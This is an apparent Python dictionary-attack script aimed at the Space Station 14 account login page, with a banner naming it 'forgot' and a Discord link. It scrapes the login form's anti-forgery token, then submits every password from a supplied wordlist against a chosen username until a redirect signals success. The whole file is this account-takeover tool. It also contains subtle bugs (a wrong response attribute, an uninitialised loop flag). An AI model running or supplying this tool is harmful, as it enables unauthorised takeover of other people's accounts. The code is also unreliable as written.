import requests
from bs4 import BeautifulSoup
import shutil
import sys
import time
import threading

art = r"""
  __                       _   
 / _| ___  _ __ __ _  ___ | |_ 
| |_ / _ \| '__/ _` |/ _ \| __|
|  _| (_) | | | (_| | (_) | |_ 
|_|  \___/|_|  \__, |\___/ \__|
               |___/           

https://discord.gg/5z9hdquRfF

"""

width = shutil.get_terminal_size().columns
for line in art.splitlines():
    print(line.center(width))
    
def animation():
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while running:
        sys.stdout.write(f"\r{frames[i]} Scan...")
        sys.stdout.flush()
        time.sleep(0.1)
        i = (i + 1) % len(frames)

def main():
    global running
    start_time = time.time()
    try:
        ckey = input("CKEY: ")
        path = input("FULL PATH TO DICT: ")
            
        threading.Thread(target=animation, daemon=True).start()     

        session = requests.Session()

        login_page = session.get("https://account.spacestation14.com/Identity/Account/Login")
        soup = BeautifulSoup(login_page.text, 'html.parser')
        token = soup.find('input', {'name': '__RequestVerificationToken'})['value']

        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.readlines()

            for i, password in enumerate(passwords):
                if not running:
                    break

                password = password.strip()

                login_data = {
                    "Input.EmailOrUsername": ckey, 
                    "Input.Password": password, 
                    "Input.RememberMe": "false",
                    "__RequestVerificationToken": token
                }

                response = session.post(
                    "https://account.spacestation14.com/Identity/Account/Login",
                    data=login_data,
                    allow_redirects=False
                )
                    
                if response.status == 302 and "Location" in response.headers:
                    if response.headers["Location"].endswith("/"):
                        running = False
                        elapsed = time.time() - start_time
                        print(f"\n✅ SUCCESS!!!! PASSWORD: {password} time: {elapsed:.2f}s")
                        return
                
            running = False
            elapsed = time.time() - start_time
            print(f"\n❌ FAILED!!!! PASSWORD NOT FOUND, time: {elapsed:.2f}s")

    except FileNotFoundError:
        running = False
        print("❌ DICT NOT FOUND")
    except Exception as e:
        running = False
        print(f"❌ ERROR: {str(e)}")
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start_time
        print(f"\n❌ ok, time: {elapsed:.2f}s")

if __name__ == '__main__':
    main()
    running = False
    time.sleep(0.2)